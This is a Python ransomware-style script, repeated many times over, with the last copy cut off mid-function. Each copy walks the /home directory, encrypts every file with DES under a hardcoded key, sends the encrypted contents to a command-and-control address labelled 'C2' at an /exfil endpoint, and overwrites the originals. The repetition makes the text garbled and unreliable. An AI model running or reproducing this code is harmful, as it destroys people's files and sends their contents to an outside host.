#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
